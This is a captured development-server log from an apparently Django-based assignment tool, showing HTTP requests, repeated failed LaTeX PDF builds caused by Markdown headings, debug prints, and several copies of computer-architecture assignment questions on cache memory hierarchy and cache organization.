+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+Removed: latex/assignment_pdf.aux
+Removed: latex/assignment_pdf.fls
+Removed: latex/assignment_pdf.fdb_latexmk
+Removed: latex/assignment_pdf.log
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+4
+[15/Jun/2024 08:50:49] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 08:51:00] "OPTIONS /api/questions/order/4/ HTTP/1.1" 200 0
+[15/Jun/2024 08:51:00] "PUT /api/questions/order/4/ HTTP/1.1" 200 50
+Rc files read:
+  /etc/LatexMk
+Latexmk: This is Latexmk, John Collins, 20 November 2021, version: 4.76.
+Rule 'pdflatex': File changes, etc:
+   Changed files, or newly in use since previous run(s):
+      '/root/Project/Backend/latex/assignment_pdf.tex'
+------------
+Run number 1 of rule 'pdflatex'
+------------
+------------
+Running 'pdflatex  --interaction=nonstopmode -recorder  "/root/Project/Backend/latex/assignment_pdf.tex"'
+------------
+Latexmk: applying rule 'pdflatex'...
+This is pdfTeX, Version 3.141592653-2.6-1.40.22 (TeX Live 2022/dev/Debian) (preloaded format=pdflatex)
+ restricted \write18 enabled.
+entering extended mode
+(/root/Project/Backend/latex/assignment_pdf.tex
+LaTeX2e <2021-11-15> patch level 1
+L3 programming layer <2022-01-21>
+(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
+Document Class: article 2021/10/04 v1.4n Standard LaTeX document class
+(/usr/share/texlive/texmf-dist/tex/latex/base/size10.clo))
+(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/inputenc.sty)
+(/usr/share/texmf/tex/latex/lm/lmodern.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/textcomp.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/lastpage/lastpage.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/ifvtex.sty
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/iftex.sty)))
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def)))
+(/usr/share/texlive/texmf-dist/tex/latex/ragged2e/ragged2e.sty)
+(/usr/share/texmf/tex/latex/lm/t1lmr.fd)
+(/usr/share/texlive/texmf-dist/tex/latex/l3backend/l3backend-pdftex.def)
+(./assignment_pdf.aux)
+*geometry* driver: auto-detecting
+*geometry* detected driver: pdftex
+(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
+[Loading MPS to PDF converter (version 2006.09.02).]
+) (/usr/share/texlive/texmf-dist/tex/latex/epstopdf-pkg/epstopdf-base.sty
+(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))
+(/usr/share/texmf/tex/latex/lm/ot1lmr.fd)
+(/usr/share/texmf/tex/latex/lm/omllmm.fd)
+(/usr/share/texmf/tex/latex/lm/omslmsy.fd)
+(/usr/share/texmf/tex/latex/lm/omxlmex.fd)
+! You can't use `macro parameter character #' in vertical mode.
+l.46 #
+      # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.46 ##
+        Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.48 #
+      ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.48 ##
+       # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.48 ###
+         Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.51 #
+      ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.51 ##
+       # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.51 ###
+         Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.64 #
+      # Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.64 ##
+        Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.68 #
+      # Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.68 ##
+        Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.77 #
+      # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.77 ##
+        Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.79 #
+      ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.79 ##
+       # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.79 ###
+         Part 1: Analysis of Cache Performance
+[1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map} <./logo.png> <./questiona
+ttachments/SAT_Poster_dgTs8F5.png>]
+! You can't use `macro parameter character #' in vertical mode.
+l.82 #
+      ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.82 ##
+       # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.82 ###
+         Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.91 #
+      # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.91 ##
+        Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.93 #
+      ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.93 ##
+       # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.93 ###
+         Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.96 #
+      ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.96 ##
+       # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.96 ###
+         Part 2: Recommendation for High-Performance Computing
+
+AED: lastpage setting LastPage
+[2 <./questionattachments/SAT_Poster.png>] (./assignment_pdf.aux)
+
+LaTeX Warning: Label(s) may have changed. Rerun to get cross-references right.
+
+ )
+(see the transcript file for additional information){/usr/share/texmf/fonts/enc
+/dvips/lm/lm-ec.enc}</usr/share/texmf/fonts/type1/public/lm/lmbx10.pfb></usr/sh
+are/texmf/fonts/type1/public/lm/lmbx12.pfb></usr/share/texmf/fonts/type1/public
+/lm/lmr10.pfb></usr/share/texmf/fonts/type1/public/lm/lmr12.pfb>
+Output written on assignment_pdf.pdf (2 pages, 430802 bytes).
+Transcript written on assignment_pdf.log.
+Latexmk: References changed.
+Latexmk: Log file says output to 'assignment_pdf.pdf'
+Collected error summary (may duplicate other messages):
+  pdflatex: Command for 'pdflatex' gave return code 1
+      Refer to 'assignment_pdf.log' for details
+Latexmk: Use the -f option to force complete processing,
+ unless error was exceeding maximum runs, or warnings treated as errors.
+Latexmk: Examining 'assignment_pdf.log'
+=== TeX engine is 'pdfTeX'
+Latexmk: Errors, so I did not complete making targets
+
+An error occurred: Command '['latexmk', '--pdf', '--interaction=nonstopmode', '/root/Project/Backend/latex/assignment_pdf.tex']' returned non-zero exit status 12.
+Removed: latex/assignment_pdf.aux
+Removed: latex/assignment_pdf.fls
+Removed: latex/assignment_pdf.fdb_latexmk
+Removed: latex/assignment_pdf.log
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+4
+[15/Jun/2024 08:51:03] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 08:51:28] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:51:29] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:51:29] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:51:32] "GET /api/questions/assignment/4/ HTTP/1.1" 200 3368
+[15/Jun/2024 08:51:32] "GET /api/questions/assignment/4/ HTTP/1.1" 200 3368
+[15/Jun/2024 08:51:36] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:52:12] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:52:12] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:52:12] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:52:12] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:52:47] "GET /api/questions/assignment/4/ HTTP/1.1" 200 3368
+[15/Jun/2024 08:52:47] "GET /api/questions/assignment/4/ HTTP/1.1" 200 3368
+[15/Jun/2024 08:52:59] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:52:59] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:52:59] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:52:59] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:53:08] "GET /api/questions/assignment/4/ HTTP/1.1" 200 3368
+[15/Jun/2024 08:53:08] "GET /api/questions/assignment/4/ HTTP/1.1" 200 3368
+[15/Jun/2024 08:53:27] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:53:28] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:53:28] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:53:28] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:53:36] "GET /api/brainstorms/?assignment_id=4 HTTP/1.1" 200 3922
+[15/Jun/2024 08:53:37] "GET /api/brainstorms/?assignment_id=4 HTTP/1.1" 200 3922
+[15/Jun/2024 08:53:49] "OPTIONS /api/ideas/?brainstorm_id=30 HTTP/1.1" 200 0
+[15/Jun/2024 08:53:49] "OPTIONS /api/ideas/?brainstorm_id=30 HTTP/1.1" 200 0
+[15/Jun/2024 08:53:52] "GET /api/ideas/?brainstorm_id=30 HTTP/1.1" 200 1899
+[15/Jun/2024 08:53:53] "GET /api/ideas/?brainstorm_id=30 HTTP/1.1" 200 1899
+[15/Jun/2024 08:53:59] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:53:59] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:53:59] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:53:59] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:54:03] "GET /api/brainstorms/?assignment_id=4 HTTP/1.1" 200 3922
+[15/Jun/2024 08:54:03] "GET /api/brainstorms/?assignment_id=4 HTTP/1.1" 200 3922
+[15/Jun/2024 08:54:06] "GET /api/ideas/?brainstorm_id=31 HTTP/1.1" 200 1905
+[15/Jun/2024 08:54:06] "GET /api/ideas/?brainstorm_id=31 HTTP/1.1" 200 1905
+Rc files read:
+  /etc/LatexMk
+Latexmk: This is Latexmk, John Collins, 20 November 2021, version: 4.76.
+Rule 'pdflatex': File changes, etc:
+   Changed files, or newly in use since previous run(s):
+      '/root/Project/Backend/latex/assignment_pdf.tex'
+------------
+Run number 1 of rule 'pdflatex'
+------------
+------------
+Running 'pdflatex  --interaction=nonstopmode -recorder  "/root/Project/Backend/latex/assignment_pdf.tex"'
+------------
+Latexmk: applying rule 'pdflatex'...
+This is pdfTeX, Version 3.141592653-2.6-1.40.22 (TeX Live 2022/dev/Debian) (preloaded format=pdflatex)
+ restricted \write18 enabled.
+entering extended mode
+(/root/Project/Backend/latex/assignment_pdf.tex
+LaTeX2e <2021-11-15> patch level 1
+L3 programming layer <2022-01-21>
+(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
+Document Class: article 2021/10/04 v1.4n Standard LaTeX document class
+(/usr/share/texlive/texmf-dist/tex/latex/base/size10.clo))
+(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/inputenc.sty)
+(/usr/share/texmf/tex/latex/lm/lmodern.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/textcomp.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/lastpage/lastpage.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/ifvtex.sty
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/iftex.sty)))
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def)))
+(/usr/share/texlive/texmf-dist/tex/latex/ragged2e/ragged2e.sty)
+(/usr/share/texmf/tex/latex/lm/t1lmr.fd)
+(/usr/share/texlive/texmf-dist/tex/latex/l3backend/l3backend-pdftex.def)
+(./assignment_pdf.aux)
+*geometry* driver: auto-detecting
+*geometry* detected driver: pdftex
+(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
+[Loading MPS to PDF converter (version 2006.09.02).]
+) (/usr/share/texlive/texmf-dist/tex/latex/epstopdf-pkg/epstopdf-base.sty
+(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))
+(/usr/share/texmf/tex/latex/lm/ot1lmr.fd)
+(/usr/share/texmf/tex/latex/lm/omllmm.fd)
+(/usr/share/texmf/tex/latex/lm/omslmsy.fd)
+(/usr/share/texmf/tex/latex/lm/omxlmex.fd)
+! You can't use `macro parameter character #' in vertical mode.
+l.46 #
+      # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.46 ##
+        Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.48 #
+      ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.48 ##
+       # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.48 ###
+         Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.51 #
+      ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.51 ##
+       # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.51 ###
+         Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.64 #
+      # Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.64 ##
+        Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.68 #
+      # Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.68 ##
+        Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.77 #
+      # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.77 ##
+        Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.79 #
+      ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.79 ##
+       # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.79 ###
+         Part 1: Analysis of Cache Performance
+[1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map} <./logo.png> <./questiona
+ttachments/SAT_Poster_dgTs8F5.png>]
+! You can't use `macro parameter character #' in vertical mode.
+l.82 #
+      ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.82 ##
+       # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.82 ###
+         Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.91 #
+      # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.91 ##
+        Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.93 #
+      ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.93 ##
+       # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.93 ###
+         Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.96 #
+      ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.96 ##
+       # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.96 ###
+         Part 2: Recommendation for High-Performance Computing
+
+AED: lastpage setting LastPage
+[2 <./questionattachments/SAT_Poster.png>] (./assignment_pdf.aux)
+
+LaTeX Warning: Label(s) may have changed. Rerun to get cross-references right.
+
+ )
+(see the transcript file for additional information){/usr/share/texmf/fonts/enc
+/dvips/lm/lm-ec.enc}</usr/share/texmf/fonts/type1/public/lm/lmbx10.pfb></usr/sh
+are/texmf/fonts/type1/public/lm/lmbx12.pfb></usr/share/texmf/fonts/type1/public
+/lm/lmr10.pfb></usr/share/texmf/fonts/type1/public/lm/lmr12.pfb>
+Output written on assignment_pdf.pdf (2 pages, 430802 bytes).
+Transcript written on assignment_pdf.log.
+Latexmk: References changed.
+Latexmk: Log file says output to 'assignment_pdf.pdf'
+Collected error summary (may duplicate other messages):
+  pdflatex: Command for 'pdflatex' gave return code 1
+      Refer to 'assignment_pdf.log' for details
+Latexmk: Use the -f option to force complete processing,
+ unless error was exceeding maximum runs, or warnings treated as errors.
+Latexmk: Examining 'assignment_pdf.log'
+=== TeX engine is 'pdfTeX'
+Latexmk: Errors, so I did not complete making targets
+
+An error occurred: Command '['latexmk', '--pdf', '--interaction=nonstopmode', '/root/Project/Backend/latex/assignment_pdf.tex']' returned non-zero exit status 12.
+30
+30
+31
+31
+[15/Jun/2024 08:54:18] "POST /api/questions/ HTTP/1.1" 201 2456
+[15/Jun/2024 08:54:18] "GET /api/questions/assignment/4/ HTTP/1.1" 200 5825
+[15/Jun/2024 08:54:19] "GET /api/questions/assignment/4/ HTTP/1.1" 200 5825
+[15/Jun/2024 08:54:33] "OPTIONS /api/questions/14/ HTTP/1.1" 200 0
+[15/Jun/2024 08:54:33] "PATCH /api/questions/14/ HTTP/1.1" 200 2457
+[15/Jun/2024 08:54:38] "PATCH /api/questions/14/ HTTP/1.1" 200 2457
+[15/Jun/2024 08:54:49] "PATCH /api/questions/14/ HTTP/1.1" 200 2457
+The concept of a memory hierarchy is integral to computer architecture, illustrating the various levels of memory and their roles in storing and providing access to data. At the pinnacle of this hierarchy resides the cache memory, an essential component strategically positioned to facilitate expeditious data retrieval and enhance system performance. 
+
+## Question: 
+
+### Part 1: 
+
+Explain the concept of a memory hierarchy, its purpose, and the unique position cache memory occupies within this structure. Elaborate on the following: 
+
+- The strategic placement of cache memory within the hierarchy and its proximity to the processor. 
+
+- How cache memory interacts with other memory levels, such as main memory and secondary storage. 
+
+### Part 2: 
+
+Provide a diagram illustrating the memory hierarchy, clearly depicting the following: 
+
+- The various levels of the hierarchy, including cache memory, main memory, and secondary storage. 
+
+- The flow of data between the processor and different memory levels, highlighting cache memory's role as a high-speed intermediary. 
+
+### Part 3: 
+
+Discuss the design considerations for optimizing cache performance, taking into account the following factors: 
+
+- Cache size and its impact on hit rate and system speed. 
+
+- Cache organization, including direct-mapped, fully associative, and set-associative caches, and the trade-offs between them. 
+
+- Replacement policies, such as Least Recently Used (LRU), and their influence on cache efficiency. 
+
+- Write policies, including write-back and write-through, and their implications for data consistency and system performance. 
+
+Provide specific examples and analyses to substantiate your explanations, ensuring a comprehensive understanding of cache memory's role and the design choices that influence its performance within the memory hierarchy.
+hear we are {'is_selected_for_assignment': False} The concept of a memory hierarchy is integral to computer architecture, illustrating the various levels of memory and their roles in storing and providing access to data. At the pinnacle of this hierarchy resides the cache memory, an essential component strategically positioned to facilitate expeditious data retrieval and enhance system performance. 
+
+## Question: 
+
+### Part 1: 
+
+Explain the concept of a memory hierarchy, its purpose, and the unique position cache memory occupies within this structure. Elaborate on the following: 
+
+- The strategic placement of cache memory within the hierarchy and its proximity to the processor. 
+
+- How cache memory interacts with other memory levels, such as main memory and secondary storage. 
+
+### Part 2: 
+
+Provide a diagram illustrating the memory hierarchy, clearly depicting the following: 
+
+- The various levels of the hierarchy, including cache memory, main memory, and secondary storage. 
+
+- The flow of data between the processor and different memory levels, highlighting cache memory's role as a high-speed intermediary. 
+
+### Part 3: 
+
+Discuss the design considerations for optimizing cache performance, taking into account the following factors: 
+
+- Cache size and its impact on hit rate and system speed. 
+
+- Cache organization, including direct-mapped, fully associative, and set-associative caches, and the trade-offs between them. 
+
+- Replacement policies, such as Least Recently Used (LRU), and their influence on cache efficiency. 
+
+- Write policies, including write-back and write-through, and their implications for data consistency and system performance. 
+
+Provide specific examples and analyses to substantiate your explanations, ensuring a comprehensive understanding of cache memory's role and the design choices that influence its performance within the memory hierarchy.
+hear we are {'is_selected_for_assignment': False} The concept of a memory hierarchy is integral to computer architecture, illustrating the various levels of memory and their roles in storing and providing access to data. At the pinnacle of this hierarchy resides the cache memory, an essential component strategically positioned to facilitate expeditious data retrieval and enhance system performance. 
+
+## Question: 
+
+### Part 1: 
+
+Explain the concept of a memory hierarchy, its purpose, and the unique position cache memory occupies within this structure. Elaborate on the following: 
+
+- The strategic placement of cache memory within the hierarchy and its proximity to the processor. 
+
+- How cache memory interacts with other memory levels, such as main memory and secondary storage. 
+
+### Part 2: 
+
+Provide a diagram illustrating the memory hierarchy, clearly depicting the following: 
+
+- The various levels of the hierarchy, including cache memory, main memory, and secondary storage. 
+
+- The flow of data between the processor and different memory levels, highlighting cache memory's role as a high-speed intermediary. 
+
+### Part 3: 
+
+Discuss the design considerations for optimizing cache performance, taking into account the following factors: 
+
+- Cache size and its impact on hit rate and system speed. 
+
+- Cache organization, including direct-mapped, fully associative, and set-associative caches, and the trade-offs between them. 
+
+- Replacement policies, such as Least Recently Used (LRU), and their influence on cache efficiency. 
+
+- Write policies, including write-back and write-through, and their implications for data consistency and system performance. 
+
+Provide specific examples and analyses to substantiate your explanations, ensuring a comprehensive understanding of cache memory's role and the design choices that influence its performance within the memory hierarchy.
+hear we are {'is_selected_for_assignment': False} The concept of a memory hierarchy is integral to computer architecture, illustrating the various levels of memory and their roles in storing and providing access to data. At the pinnacle of this hierarchy resides the cache memory, an essential component strategically positioned to facilitate expeditious data retrieval and enhance system performance. 
+
+## Question: 
+
+### Part 1: 
+
+Explain the concept of a memory hierarchy, its purpose, and the unique position cache memory occupies within this structure. Elaborate on the following: 
+
+- The strategic placement of cache memory within the hierarchy and its proximity to the processor. 
+
+- How cache memory interacts with other memory levels, such as main memory and secondary storage. 
+
+### Part 2: 
+
+Provide a diagram illustrating the memory hierarchy, clearly depicting the following: 
+
+- The various levels of the hierarchy, including cache memory, main memory, and secondary storage. 
+
+- The flow of data between the processor and different memory levels, highlighting cache memory's role as a high-speed intermediary. 
+
+### Part 3: 
+
+Discuss the design considerations for optimizing cache performance, taking into account the following factors: 
+
+- Cache size and its impact on hit rate and system speed. 
+
+- Cache organization, including direct-mapped, fully associative, and set-associative caches, and the trade-offs between them. 
+
+- Replacement policies, such as Least Recently Used (LRU), and their influence on cache efficiency. 
+
+- Write policies, including write-back and write-through, and their implications for data consistency and system performance. 
+
+Provide specific examples and analyses to substantiate your explanations, ensuring a comprehensive understanding of cache memory's role and the design choices that influence its performance within the memory hierarchy.
+hear we are {'is_selected_for_assignment': False} [15/Jun/2024 08:54:49] "PATCH /api/questions/14/ HTTP/1.1" 200 2457
+[15/Jun/2024 08:54:55] "PATCH /api/questions/14/ HTTP/1.1" 200 2457
+[15/Jun/2024 08:54:57] "PATCH /api/questions/14/ HTTP/1.1" 200 2555
+[15/Jun/2024 08:54:57] "GET /api/questions/assignment/4/ HTTP/1.1" 200 5949
+[15/Jun/2024 08:55:03] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:55:03] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:55:03] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:55:04] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:55:07] "GET /api/questions/sorted/4/ HTTP/1.1" 200 5949
+[15/Jun/2024 08:55:07] "GET /api/questions/sorted/4/ HTTP/1.1" 200 5949
+The concept of a memory hierarchy is integral to computer architecture, illustrating the various levels of memory and their roles in storing and providing access to data. At the pinnacle of this hierarchy resides the cache memory, an essential component strategically positioned to facilitate expeditious data retrieval and enhance system performance. 
+
+## Question: 
+
+### Part 1: 
+
+Explain the concept of a memory hierarchy, its purpose, and the unique position cache memory occupies within this structure. Elaborate on the following: 
+
+- The strategic placement of cache memory within the hierarchy and its proximity to the processor. 
+
+- How cache memory interacts with other memory levels, such as main memory and secondary storage. 
+
+### Part 2: 
+
+Provide a diagram illustrating the memory hierarchy, clearly depicting the following: 
+
+- The various levels of the hierarchy, including cache memory, main memory, and secondary storage. 
+
+- The flow of data between the processor and different memory levels, highlighting cache memory's role as a high-speed intermediary. 
+
+### Part 3: 
+
+Discuss the design considerations for optimizing cache performance, taking into account the following factors: 
+
+- Cache size and its impact on hit rate and system speed. 
+
+- Cache organization, including direct-mapped, fully associative, and set-associative caches, and the trade-offs between them. 
+
+- Replacement policies, such as Least Recently Used (LRU), and their influence on cache efficiency. 
+
+- Write policies, including write-back and write-through, and their implications for data consistency and system performance. 
+
+Provide specific examples and analyses to substantiate your explanations, ensuring a comprehensive understanding of cache memory's role and the design choices that influence its performance within the memory hierarchy.
+hear we are {'is_selected_for_assignment': False} The concept of a memory hierarchy is integral to computer architecture, illustrating the various levels of memory and their roles in storing and providing access to data. At the pinnacle of this hierarchy resides the cache memory, an essential component strategically positioned to facilitate expeditious data retrieval and enhance system performance. 
+
+## Question: 
+
+### Part 1: 
+
+Explain the concept of a memory hierarchy, its purpose, and the unique position cache memory occupies within this structure. Elaborate on the following: 
+
+- The strategic placement of cache memory within the hierarchy and its proximity to the processor. 
+
+- How cache memory interacts with other memory levels, such as main memory and secondary storage. 
+
+### Part 2: 
+
+Provide a diagram illustrating the memory hierarchy, clearly depicting the following: 
+
+- The various levels of the hierarchy, including cache memory, main memory, and secondary storage. 
+
+- The flow of data between the processor and different memory levels, highlighting cache memory's role as a high-speed intermediary. 
+
+### Part 3: 
+
+Discuss the design considerations for optimizing cache performance, taking into account the following factors: 
+
+- Cache size and its impact on hit rate and system speed. 
+
+- Cache organization, including direct-mapped, fully associative, and set-associative caches, and the trade-offs between them. 
+
+- Replacement policies, such as Least Recently Used (LRU), and their influence on cache efficiency. 
+
+- Write policies, including write-back and write-through, and their implications for data consistency and system performance. 
+
+Provide specific examples and analyses to substantiate your explanations, ensuring a comprehensive understanding of cache memory's role and the design choices that influence its performance within the memory hierarchy.
+hear we are <QueryDict: {'details_modified': ["The concept of a memory hierarchy is integral to computer architecture, illustrating the various levels of memory and their roles in storing and providing access to data. At the pinnacle of this hierarchy resides the cache memory, an essential component strategically positioned to facilitate expeditious data retrieval and enhance system performance. \r\n\r\n## Question: \r\n\r\n### Part 1: \r\n\r\nExplain the concept of a memory hierarchy, its purpose, and the unique position cache memory occupies within this structure. Elaborate on the following: \r\n\r\n- The strategic placement of cache memory within the hierarchy and its proximity to the processor. \r\n\r\n- How cache memory interacts with other memory levels, such as main memory and secondary storage. \r\n\r\n### Part 2: \r\n\r\nProvide a diagram illustrating the memory hierarchy, clearly depicting the following: \r\n\r\n- The various levels of the hierarchy, including cache memory, main memory, and secondary storage. \r\n\r\n- The flow of data between the processor and different memory levels, highlighting cache memory's role as a high-speed intermediary. \r\n\r\n### Part 3: \r\n\r\nDiscuss the design considerations for optimizing cache performance, taking into account the following factors: \r\n\r\n- Cache size and its impact on hit rate and system speed. \r\n\r\n- Cache organization, including direct-mapped, fully associative, and set-associative caches, and the trade-offs between them. \r\n\r\n- Replacement policies, such as Least Recently Used (LRU), and their influence on cache efficiency. \r\n\r\n- Write policies, including write-back and write-through, and their implications for data consistency and system performance. \r\n\r\nProvide specific examples and analyses to substantiate your explanations, ensuring a comprehensive understanding of cache memory's role and the design choices that influence its performance within the memory hierarchy."], 'attachment': [<InMemoryUploadedFile: 46993.jpg (image/jpeg)>]}> The concept of a memory hierarchy is integral to computer architecture, illustrating the various levels of memory and their roles in storing and providing access to data. At the pinnacle of this hierarchy resides the cache memory, an essential component strategically positioned to facilitate expeditious data retrieval and enhance system performance. 
+
+## Question: 
+
+### Part 1: 
+
+Explain the concept of a memory hierarchy, its purpose, and the unique position cache memory occupies within this structure. Elaborate on the following: 
+
+- The strategic placement of cache memory within the hierarchy and its proximity to the processor. 
+
+- How cache memory interacts with other memory levels, such as main memory and secondary storage. 
+
+### Part 2: 
+
+Provide a diagram illustrating the memory hierarchy, clearly depicting the following: 
+
+- The various levels of the hierarchy, including cache memory, main memory, and secondary storage. 
+
+- The flow of data between the processor and different memory levels, highlighting cache memory's role as a high-speed intermediary. 
+
+### Part 3: 
+
